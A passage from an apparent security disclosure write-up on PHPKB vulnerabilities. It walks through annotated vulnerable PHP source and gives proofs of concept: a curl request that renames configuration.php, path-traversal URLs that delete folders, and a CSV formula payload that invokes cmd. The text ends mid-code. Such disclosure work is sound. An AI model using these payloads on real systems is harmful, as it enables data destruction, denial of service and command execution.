+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="c1">// Skipping some code</span>
+					<span class="o">&lt;</span><span class="n">button</span> <span class="n">type</span><span class="o">=</span><span class="s2">"button"</span> <span class="n">class</span><span class="o">=</span><span class="s2">"btn btn-warning"</span> <span class="n">data</span><span class="o">-</span><span class="n">dismiss</span><span class="o">=</span><span class="s2">"modal"</span> <span class="n">onclick</span><span class="o">=</span><span class="s2">"&lt;?php echo "</span><span class="nf">commonOperations</span><span class="p">(</span><span class="s1">'lang-change-alert||0||0||{$lang_header}||{$_GET_exists}||{$HIDDEN_lang_id}'</span><span class="p">)</span><span class="s2">"; ?&gt;"</span><span class="o">&gt;</span><span class="nc">Yes</span><span class="p">,</span> <span class="k">do</span> <span class="n">it</span><span class="o">&lt;/</span><span class="n">button</span><span class="o">&gt;</span> <span class="c1">//The variable $lang_header is printed without being sanitized, Cross-Site Scripting occurs</span></code></pre></figure>
+
+<p>Some proof of concepts:</p>
+
+<p><img src="/assets/uxss1.png" alt="Universal XSS 1" title="Universal XSS 1" />
+<img src="/assets/uxss2.png" alt="Universal XSS 2" title="Universal XSS 2" />
+<img src="/assets/uxss3.png" alt="Universal XSS 3" title="Universal XSS 3" /></p>
+
+<h2 id="arbitrary-file-renaming-cve-2020-10457">Arbitrary File Renaming (CVE-2020-10457)</h2>
+<p>Exploitable by: Superuser/Editor/Writer/Translator</p>
+
+<p>Vulnerable file: admin/imagepaster/image-renaming.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="c1">// Skipping some code and includes</span>
+<span class="nv">$imgUrl</span> 	<span class="o">=</span> <span class="nb">trim</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'imgUrl'</span><span class="p">]</span> <span class="p">);</span> <span class="c1">//The variable $imgUrl contains the path of the image that you want to be renamed, taken from the POST parameter imgUrl</span>
+<span class="nv">$imgNewName</span> <span class="o">=</span>  <span class="nb">trim</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'imgName'</span><span class="p">]</span> <span class="p">)</span> <span class="p">;</span> <span class="c1">//The varible $imgNewName contains the new image name, taken from the POST parameter imgName</span>
+<span class="c1">// Skipping some code</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">rename</span><span class="p">(</span><span class="nv">$imgRelPath</span><span class="p">,</span><span class="nv">$newRelPath</span><span class="p">)){</span> <span class="c1">//The renaming is done here, using PHP's built-in function rename(); if there is an error, print a message</span>
+	<span class="nf">json_error</span><span class="p">(</span><span class="s1">'Error in renaming file.'</span><span class="p">);</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Since there isn’t any check on the extension, we can rename any file we want. In order to cause a Denial of service, we can rename the admin/include/configuration.php file. Proof of concept:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">curl <span class="nt">--cookie</span> <span class="s2">"phpkb-rvaids=1; PHPSESSID=XYZXYZXYZ"</span> <span class="nt">-d</span> <span class="s2">"imgUrl=../../assets/../admin/include/configuration.php&amp;imgName=test"</span> <span class="o">[</span>PHPKB]/admin/imagepaster/image-renaming.php</code></pre></figure>
+
+<p><a href="https://vimeo.com/490370910">Video</a></p>
+
+<h2 id="arbitrary-folder-deletion-cve-2020-10458">Arbitrary Folder Deletion (CVE-2020-10458)</h2>
+<p>Exploitable by: Superuser/Editor/Writer/Translator</p>
+
+<p>Vulnerable file: admin/assetmanager/operations.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="k">include_once</span><span class="p">(</span><span class="s1">'../include/session-check.php'</span><span class="p">);</span> <span class="c1">//Checks if we are logged in</span>
+<span class="c1">// Skipping some code</span>
+<span class="nv">$_action</span> 	<span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'action'</span><span class="p">];</span> <span class="c1">//The value from the GET parameter action is assigned to the $_action variabke, defines what we want to do, in our case, delete a folder</span>
+<span class="nv">$crdir</span> 		<span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'crdir'</span><span class="p">]));</span> <span class="c1">//The value from the GET parameter crdir is assigned to the $crdir variable, represents the folder that we want to delete</span>
+<span class="k">switch</span><span class="p">(</span><span class="nv">$_action</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="nv">$dir</span> <span class="o">=</span> <span class="nv">$crdir</span><span class="p">;</span> <span class="c1">//The content of the variable $crdir is copied inside $dir</span>
+<span class="c1">// Skipping some code</span>
+	<span class="k">case</span> <span class="s1">'df'</span><span class="o">:</span> <span class="c1">//If $_action equals df, then we are deleting a folder</span>
+		<span class="nv">$handle</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span> <span class="c1">//Opens directory handle</span>
+		<span class="k">while</span><span class="p">(</span><span class="nv">$file</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">))</span> <span class="k">if</span><span class="p">(</span><span class="nv">$file</span> <span class="o">!=</span> <span class="s2">"."</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span> <span class="o">!=</span> <span class="s2">".."</span><span class="p">)</span> <span class="nb">unlink</span><span class="p">(</span><span class="nv">$dir</span> <span class="mf">.</span> <span class="s2">"/"</span> <span class="mf">.</span> <span class="nv">$file</span><span class="p">);</span> <span class="c1">//Deletes all the files</span>
+		<span class="nb">closedir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span> <span class="c1">//Closes directory handle</span></code></pre></figure>
+
+<p>The following proof of concept will delete a folder located in the root directory (C:):</p>
+
+<p><code class="language-plaintext highlighter-rouge">[PHPKB]/admin/assetmanager/operations.php?action=df&amp;crdir=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ftestf</code></p>
+
+<p><a href="https://vimeo.com/490371096">Video 1</a></p>
+
+<p>The following proof of concept will delete the admin/include folder, causing a denial of service:</p>
+
+<p><code class="language-plaintext highlighter-rouge">[PHPKB]/admin/assetmanager/operations.php?action=df&amp;crdir=..%2Finclude</code></p>
+
+<p><a href="https://vimeo.com/490371539">Video 2</a></p>
+
+<h2 id="csv-injection-cve-2020-10460">CSV Injection (CVE-2020-10460)</h2>
+<p>Exploitable by: Superuser</p>
+
+<p>Vulnerable file: admin/include/operations.php</p>
+
+<p>A Superuser can export e-mails found in the knowledgebase in .csv format via admin/email-harvester.php</p>
+
+<p>File: admin/email-harvester.php</p>
+
+<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"js/harvester.js"</span> <span class="na">type=</span><span class="s">"text/javascript"</span><span class="nt">&gt;&lt;/script&gt;</span> //This javascript file handles the csv creation process, let's analyze it</code></pre></figure>
+
+<p>File: admin/js/harvester.js</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php">		<span class="k">case</span> <span class="s1">'export-csv'</span><span class="o">:</span>
+			<span class="k">if</span><span class="p">(</span><span class="n">f</span><span class="mf">.</span><span class="n">extractedmails</span><span class="mf">.</span><span class="n">value</span><span class="o">==</span><span class="s1">''</span><span class="p">){</span> <span class="c1">//If there are no e-mails extracted, show an error</span>
+				<span class="nf">jQuery</span><span class="p">(</span><span class="s1">'#atleast_one_email'</span><span class="p">)</span><span class="mf">.</span><span class="nf">modal</span><span class="p">(</span><span class="s1">'show'</span><span class="p">);</span> 
+				<span class="c1">//alert('Specify at least one email address for export to csv'); </span>
+				<span class="k">return</span><span class="p">;</span>
+			<span class="p">}</span>
+			<span class="k">var</span> <span class="n">data</span> 	 <span class="o">=</span> <span class="n">f</span><span class="mf">.</span><span class="n">extractedmails</span><span class="mf">.</span><span class="n">value</span><span class="mf">.</span><span class="nf">replace</span><span class="p">(</span><span class="o">/</span><span class="err">\</span><span class="n">n\r</span><span class="o">?/</span><span class="n">g</span><span class="p">,</span> <span class="s1">'||'</span><span class="p">);</span> <span class="c1">//Replace newlines with ||</span>
+			<span class="n">passParams</span>  <span class="o">+=</span> <span class="s1">'data='</span><span class="o">+</span><span class="nf">encodeURI</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
+			<span class="n">passParams</span>  <span class="o">+=</span> <span class="s1">'&amp;called=ajax&amp;act=harvest&amp;sub_act=csvexport'</span><span class="p">;</span> <span class="c1">//Prepare the parameters that are going to be sent to the server</span>
+ 
+			<span class="err">$</span><span class="mf">.</span><span class="nf">ajax</span><span class="p">({</span>
+				<span class="n">url</span><span class="o">:</span><span class="s2">"include/operations.php"</span><span class="p">,</span> <span class="c1">//Send the parameters to include/operations.php</span>
+				<span class="n">type</span><span class="o">:</span><span class="s2">"post"</span><span class="p">,</span>
+				<span class="n">data</span><span class="o">:</span><span class="n">passParams</span><span class="p">,</span>
+				<span class="n">success</span><span class="o">:</span><span class="k">function</span><span class="p">(</span><span class="kt">result</span><span class="p">){</span>
+		      		<span class="err">$</span><span class="p">(</span><span class="s2">"#"</span><span class="o">+</span><span class="n">subject_id</span><span class="p">)</span><span class="mf">.</span><span class="nf">html</span><span class="p">(</span><span class="n">result</span><span class="p">);</span>
+					<span class="err">$</span><span class="p">(</span><span class="s1">'html, body'</span><span class="p">)</span><span class="mf">.</span><span class="nf">animate</span><span class="p">({</span>
+					    <span class="n">scrollTop</span><span class="o">:</span> <span class="err">$</span><span class="p">(</span><span class="s2">"#"</span><span class="o">+</span><span class="n">subject_id</span><span class="p">)</span><span class="mf">.</span><span class="nf">offset</span><span class="p">()</span><span class="mf">.</span><span class="n">top</span><span class="o">-</span><span class="mi">60</span>
+					<span class="p">},</span> <span class="mi">2000</span><span class="p">);</span>
+		    	<span class="p">}</span>
+		    <span class="p">});</span>
+		<span class="k">break</span><span class="p">;</span></code></pre></figure>
+
+<p>File: admin/include/operations.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="c1">//These are the parameters sent by the javascript file:</span>
+<span class="c1">//&amp;called=ajax&amp;act=harvest&amp;sub_act=csvexport</span>
+<span class="c1">// Skipping some code and includes</span>
+	<span class="k">if</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'called'</span><span class="p">])</span><span class="o">==</span><span class="s1">'ajax'</span><span class="p">)</span> <span class="c1">//First condition is met</span>
+	<span class="p">{</span>
+		<span class="k">switch</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'act'</span><span class="p">])){</span><span class="c1">//Switch case, looking for the value of the POST parameter act, which should be harvest</span>
+			<span class="k">case</span> <span class="s1">'harvest'</span><span class="o">:</span> <span class="c1">//Case harvest found</span>
+				<span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'admin_level_Session_ML'</span><span class="p">]</span><span class="o">==</span><span class="s1">'Superuser'</span><span class="p">){</span> <span class="c1">//If we are logged in as a Superuser</span>
+					<span class="nv">$subAction</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'sub_act'</span><span class="p">]);</span> <span class="c1">//The content of the POST parameter sub_act is copied into the $subAction variable</span>
+					<span class="k">include_once</span><span class="p">(</span><span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/functions-harvest.php'</span><span class="p">);</span> <span class="c1">//The functions needed are loaded</span>
+					<span class="k">switch</span><span class="p">(</span><span class="nv">$subAction</span><span class="p">){</span><span class="c1">//Switch case, looking for the value csvexport</span>
+						<span class="k">case</span> <span class="s1">'extract'</span><span class="o">:</span> <span class="c1">// Skipping this case</span>
+							<span class="nf">displayEmails</span><span class="p">();</span>
+						<span class="k">break</span><span class="p">;</span>
+						<span class="k">case</span> <span class="s1">'csvexport'</span><span class="o">:</span> <span class="c1">//Case found</span>
+							<span class="nv">$download_image</span>	<span class="o">=</span> <span class="s1">'&lt;img src="images/download.png" style="vertical-align:middle;" alt="Download" /&gt; '</span><span class="p">;</span>
+							<span class="nv">$_data</span> 			<span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">'||'</span><span class="p">,</span><span class="nb">str_replace</span><span class="p">(</span><span class="s1">','</span><span class="p">,</span><span class="s1">'||'</span><span class="p">,</span><span class="nb">urldecode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'data'</span><span class="p">])));</span>
+							<span class="nv">$_emails</span> 		<span class="o">=</span> <span class="nf">validateInput</span><span class="p">(</span><span class="nv">$_data</span><span class="p">);</span> <span class="c1">//We will look later for this function</span>
+							<span class="k">if</span><span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$_emails</span><span class="p">))</span>
+							<span class="p">{</span>
+								<span class="nv">$_filename</span>	<span class="o">=</span> <span class="nf">generateFilename</span><span class="p">();</span> <span class="c1">//A new random filename is created</span>
+								<span class="c1">//if(exportAsCSVManual($_filename, array('Email Address'=&gt;$_emails))){</span>
+								<span class="k">if</span><span class="p">(</span><span class="nf">exportAsCSV</span><span class="p">(</span><span class="nv">$_filename</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">'Email Address'</span><span class="o">=&gt;</span><span class="nv">$_emails</span><span class="p">))){</span> <span class="c1">//The CSV file is created, we will look later at this function</span>
+									<span class="k">echo</span> <span class="s2">"&lt;div class=</span><span class="se">\"</span><span class="s2">alert alert-success</span><span class="se">\"</span><span class="s2">&gt;
+											&lt;button type=</span><span class="se">\"</span><span class="s2">button</span><span class="se">\"</span><span class="s2"> class=</span><span class="se">\"</span><span class="s2">close</span><span class="se">\"</span><span class="s2"> data-dismiss=</span><span class="se">\"</span><span class="s2">alert</span><span class="se">\"</span><span class="s2"> aria-hidden=</span><span class="se">\"</span><span class="s2">true</span><span class="se">\"</span><span class="s2">&gt;&amp;times;&lt;/button&gt;
+											CSV File has been generated successfully. &lt;a class=</span><span class="se">\"</span><span class="s2">alert-link</span><span class="se">\"</span><span class="s2"> href=</span><span class="se">\"</span><span class="si">{</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'path_kb'</span><span class="p">]</span><span class="si">}</span><span class="s2">/admin/backups/</span><span class="nv">$_filename</span><span class="se">\"</span><span class="s2"> target=</span><span class="se">\"</span><span class="s2">_blank</span><span class="se">\"</span><span class="s2"> title=</span><span class="se">\"</span><span class="s2">Click to Download</span><span class="se">\"</span><span class="s2">&gt;</span><span class="nv">$download_image</span><span class="s2"> Download&lt;/a&gt;&lt;/div&gt;"</span><span class="p">;</span>
+								<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+									<span class="k">echo</span><span class="s2">"&lt;div class=</span><span class="se">\"</span><span class="s2">alert alert-danger</span><span class="se">\"</span><span class="s2">&gt;</span><span class="nv">$error_image</span><span class="s2">&lt;strong&gt;Error:&lt;/strong&gt; </span><span class="nv">$_error</span><span class="s2">&lt;/div&gt;"</span><span class="p">;</span>
+								<span class="p">}</span>
+							<span class="p">}</span>
+						<span class="k">break</span><span class="p">;</span>
+						<span class="k">default</span><span class="o">:</span> <span class="k">echo</span> <span class="nv">$denied_message</span><span class="p">;</span>
+					<span class="p">}</span>
+				<span class="p">}</span>
+				<span class="k">break</span><span class="p">;</span></code></pre></figure>
+
+<p>File: admin/include/functions-harvest.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="c1">// Skipping some code</span>
+<span class="k">function</span> <span class="n">validateInput</span><span class="p">(</span><span class="nv">$_data</span><span class="o">=</span><span class="k">array</span><span class="p">())</span>
+<span class="p">{</span>
+	<span class="k">foreach</span><span class="p">(</span><span class="nv">$_data</span> <span class="k">as</span> <span class="nv">$email</span><span class="p">)</span> <span class="c1">//For every email detected by the harvester</span>
+	<span class="p">{</span>
+		<span class="k">if</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$email</span><span class="p">)</span><span class="o">!=</span><span class="s1">''</span><span class="p">){</span> <span class="c1">//If the email is not a empty string</span>
+			<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*/"</span><span class="p">,</span> <span class="nv">$email</span><span class="p">)){</span> <span class="c1">//If the regular expression doesn't match the email, throw an error</span>
+				<span class="k">echo</span> <span class="s1">'&lt;div class="info red-text" style="margin-bottom:5px;"&gt;
+						&lt;strong&gt;Error:&lt;/strong&gt;
+						&lt;p&gt;Invalid email address supplied for export to csv.&lt;/p&gt;
+					 &lt;/div&gt;'</span><span class="p">;</span>
+				<span class="k">return</span><span class="p">;</span>			 
+			<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+				<span class="nv">$_validatedEmails</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$email</span><span class="p">;</span> <span class="c1">//Else, if the email matches the regular expression, add it to _validatedEmails array	</span>
+			<span class="p">}</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+ 
+<span class="c1">// Skipping some code</span>
+ 
+<span class="k">function</span> <span class="n">exportAsCSV</span><span class="p">(</span><span class="nv">$filename</span><span class="o">=</span><span class="s1">''</span><span class="p">,</span> <span class="nv">$data</span><span class="o">=</span><span class="k">array</span><span class="p">(),</span> <span class="nv">$header</span> <span class="o">=</span> <span class="kc">true</span><span class="p">)</span>
+<span class="p">{</span> <span class="c1">//Function that is responsible of creating and writing the csv file</span>
+	<span class="k">global</span> <span class="nv">$_error</span><span class="p">;</span> 
+	<span class="nv">$line</span> <span class="o">=</span> <span class="nv">$comma</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
+	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s1">'../backups/'</span><span class="mf">.</span><span class="nv">$filename</span><span class="p">,</span> <span class="s1">'wb+'</span><span class="p">)){</span> <span class="c1">//If we don't have permission to write in the ../backups/ folder, throw an error</span>
+		<span class="nv">$_error</span> <span class="o">=</span> <span class="s1">'Couldn\'t create the output file: &lt;strong&gt;'</span><span class="mf">.</span><span class="nv">$filename</span><span class="mf">.</span><span class="s1">'&lt;/strong&gt;.'</span><span class="p">;</span>
+		<span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">if</span><span class="p">(</span><span class="nv">$header</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//Write the csv header, that is to say, the rows' name</span>
+		<span class="o">@</span><span class="nb">fputcsv</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="nb">array_keys</span><span class="p">(</span><span class="nv">$data</span><span class="p">));</span> <span class="c1">// output header row </span>
+	<span class="p">}</span>
+	<span class="k">foreach</span><span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$key</span><span class="o">=&gt;</span><span class="nv">$emails</span><span class="p">){</span> <span class="c1">//Write each email into the csv file	</span>
+		<span class="k">foreach</span><span class="p">(</span><span class="nv">$emails</span> <span class="k">as</span> <span class="nv">$email</span><span class="p">){</span>
+			<span class="o">@</span><span class="nb">fputcsv</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="nv">$email</span><span class="p">));</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="nb">fclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
+	<span class="k">return</span> <span class="kc">true</span><span class="p">;</span></code></pre></figure>
+
+<p>The only check is done via this regular expression:</p>
+
+<p><code class="language-plaintext highlighter-rouge">/\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*/</code></p>
+
+<p>The regular expression can be bypassed with this payload (designed to open calc.exe for demo purposes):</p>
+
+<p><code class="language-plaintext highlighter-rouge">test@test.com||=2+5+cmd|' /C calc'!A0@test.com||||</code></p>
+
+<p><a href="https://vimeo.com/490371762">Video</a></p>
+
+<h2 id="blind-cross-site-scripting-2-cve-2020-10461">Blind Cross-Site Scripting #2 (CVE-2020-10461)</h2>
+<p>Exploitable by: Anyone, even external users</p>
+
+<p>Vulnerable file: include/functions-article.php (linked to ajax-hub.php, exploitable via posting a comment at article.php), triggered at admin/manage-comments.php</p>
+
+<p>Every time a user posts a comment on an article, the following GET request is sent to ajax-hub.php:</p>
+
+<p><code class="language-plaintext highlighter-rouge">[PHPKB]/include/ajax-hub.php?usefor=AddComments&amp;aid=1&amp;nm=myname&amp;em=my%40email.com&amp;cmt=my%20comment&amp;sc=captchacode</code></p>
+
+<p>File: include/ajax-hub.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="c1">// Skipping some code</span>
+<span class="k">if</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'act'</span><span class="p">]</span><span class="o">==</span><span class="s1">'xedit-cmt'</span> <span class="p">){</span> <span class="c1">//In our case we don't have a POST parameter act, so we jump into the else</span>
+<span class="c1">// Skipping some code</span>
+<span class="p">}</span>
+<span class="k">else</span><span class="p">{</span> 
+<span class="c1">// Skipping some code</span>
+	<span class="k">include</span><span class="p">(</span><span class="s1">'hub.php'</span><span class="p">);</span> <span class="c1">//Including hub.php, we are going to analyze this file</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>File: include/hub.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="c1">// Skipping some code and includes</span>
+	<span class="k">include</span><span class="p">(</span><span class="s1">'functions.php'</span><span class="p">);</span>
+<span class="c1">// Skipping some code</span>
+<span class="k">elseif</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'usefor'</span><span class="p">]</span><span class="o">==</span><span class="s1">'AddComments'</span><span class="p">)</span> <span class="c1">//If the GET parameter usefor equals to AddComments then execute this code</span>
+<span class="p">{</span>
+	<span class="nv">$article_id</span> <span class="o">=</span> <span class="p">(</span><span class="n">int</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'aid'</span><span class="p">];</span> <span class="nv">$name</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'nm'</span><span class="p">];</span> <span class="nv">$email</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'em'</span><span class="p">];</span> <span class="nv">$comments</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmt'</span><span class="p">];</span> <span class="nv">$scode</span><span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'sc'</span><span class="p">];</span> <span class="c1">//Copies value of GET parameters to variables</span>
+	<span class="nv">$UseFor</span> <span class="o">=</span> <span class="s1">'After Post'</span><span class="p">;</span>
+	<span class="k">echo</span> <span class="nf">Add_Comment</span><span class="p">(</span><span class="nv">$article_id</span><span class="p">);</span> <span class="c1">//The function Add_Comment is exectued, then echoed</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>File: include/functions.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="c1">// Skipping some code</span>
+	<span class="k">case</span> <span class="s1">'article.php'</span><span class="o">:</span>
+		<span class="k">include</span><span class="p">(</span> <span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/functions-inline-edit.php'</span><span class="p">);</span> <span class="c1">//The function Add_Comment isn't detailed here</span>
+		<span class="k">include</span><span class="p">(</span> <span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/functions-article.php'</span><span class="p">);</span> <span class="c1">//The function Add_Comment is detailed here</span>
+		<span class="k">include</span><span class="p">(</span> <span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/functions-articles-display.php'</span><span class="p">);</span> <span class="c1">//The function Add_Comment isn't detailed here</span>
+		<span class="k">break</span><span class="p">;</span></code></pre></figure>
+
+<p>File: include/functions-article.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="c1">// Skipping some code and includes</span>
+<span class="k">function</span> <span class="n">Add_Comment</span><span class="p">(</span><span class="nv">$article_id</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//The function Add_Comment is detailed here</span>
+<span class="c1">// Skipping some code</span>
+	<span class="k">if</span><span class="p">(</span><span class="nv">$comments_allowed</span><span class="o">==</span><span class="s1">'no'</span><span class="p">){</span> <span class="c1">//If comments are </span>
+		<span class="k">echo</span><span class="s1">'&lt;div&gt;&lt;br/&gt;&lt;/div&gt;&lt;div class="flagged-message-tpl orange-flag-tpl"&gt;&lt;div class="content"&gt;'</span><span class="mf">.</span><span class="nv">$lang</span><span class="p">[</span><span class="s1">'article_section_disabled_text'</span><span class="p">]</span><span class="mf">.</span><span class="s1">'&lt;/div&gt;&lt;/div&gt;'</span><span class="p">;</span>
+		<span class="k">return</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">if</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'UseFor'</span><span class="p">]</span><span class="o">==</span><span class="s1">'After Post'</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//True because the global scope variable UseFor was set to After Post in include/hub.php</span>
+<span class="c1">// Skipping some code</span>
+		<span class="k">if</span><span class="p">(</span><span class="nv">$name</span><span class="o">==</span><span class="s1">''</span><span class="p">)</span>		<span class="p">{</span> <span class="nv">$errors</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"&lt;li class=</span><span class="se">\"</span><span class="s2">error-text</span><span class="se">\"</span><span class="s2">&gt;</span><span class="si">{</span><span class="nv">$lang</span><span class="p">[</span><span class="s1">'required_text'</span><span class="p">]</span><span class="si">}</span><span class="s2"> (</span><span class="si">{</span><span class="nv">$lang</span><span class="p">[</span><span class="s1">'name_text'</span><span class="p">]</span><span class="si">}</span><span class="s2">)&lt;/li&gt;"</span><span class="p">;</span>	 <span class="p">}</span> <span class="c1">//If the name is empty, throw an error</span>
+		<span class="k">if</span><span class="p">(</span><span class="nv">$comments</span><span class="o">==</span><span class="s1">''</span><span class="p">)</span>	<span class="p">{</span> <span class="nv">$errors</span> <span class="mf">.</span><span class="o">=</span> <span class="s2">"&lt;li  class=</span><span class="se">\"</span><span class="s2">error-text</span><span class="se">\"</span><span class="s2">&gt;</span><span class="si">{</span><span class="nv">$lang</span><span class="p">[</span><span class="s1">'required_text'</span><span class="p">]</span><span class="si">}</span><span class="s2"> (</span><span class="si">{</span><span class="nv">$lang</span><span class="p">[</span><span class="s1">'comment_text'</span><span class="p">]</span><span class="si">}</span><span class="s2">)&lt;/li&gt;"</span><span class="p">;</span> <span class="p">}</span> <span class="c1">//If the comment is empty, throw an error</span>
+<span class="c1">// Skipping some code</span>
+			<span class="nv">$detect_entities</span><span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">"&lt;"</span><span class="p">,</span><span class="s2">"&gt;"</span><span class="p">,</span> <span class="s2">"'"</span><span class="p">,</span> <span class="s1">'"'</span><span class="p">);</span>
+			<span class="nv">$change_entities</span><span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">"&amp;lt;"</span><span class="p">,</span> <span class="s2">"&amp;gt;"</span><span class="p">,</span> <span class="s2">"&amp;#39"</span><span class="p">,</span> <span class="s2">"&amp;quot;"</span><span class="p">);</span>
+			<span class="nv">$comments</span>		<span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="nv">$detect_entities</span><span class="p">,</span> <span class="nv">$change_entities</span><span class="p">,</span> <span class="nv">$comments</span><span class="p">);</span> <span class="c1">// Some basic XSS filtering is done, however </span>
+ 
+			<span class="k">if</span><span class="p">(</span><span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">'connection'</span><span class="p">],</span> <span class="s2">"INSERT INTO phpkb_comments VALUES(0, </span><span class="nv">$article_id</span><span class="s2">, '</span><span class="nv">$name</span><span class="s2">', '</span><span class="nv">$email</span><span class="s2">', '</span><span class="nv">$comments</span><span class="s2">', NOW(), '</span><span class="nv">$comment_status</span><span class="s2">')"</span><span class="p">))</span> <span class="c1">//The variables $article_id, $name, $email, $comments, the date, and $comment_status are inserted into the database without being sanitized</span></code></pre></figure>
+
+<p>In the last step the comment is saved into the database without being sanitized. The file admin/manage-comments.php allows a Superuser/Editor to check all the comments that have been submitted to the knowledgebase:</p>
+
+<p>File: admin/manage-comments.php</p>
+
+<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<span class="c1">// Skipping some code and includes</span>
+<span class="k">include</span><span class="p">(</span> <span class="k">__DIR__</span> <span class="mf">.</span> <span class="s1">'/include/check-authority.php'</span><span class="p">);</span> <span class="c1">//Checks if we are logged in as a Superuser/Editor</span>
+<span class="c1">// Skipping some code</span>
+	<span class="nv">$query</span>			<span class="o">=</span> <span class="s2">"	SELECT * 
+						FROM phpkb_comments </span><span class="si">{</span><span class="nv">$left_outer_join</span><span class="si">}</span><span class="s2">
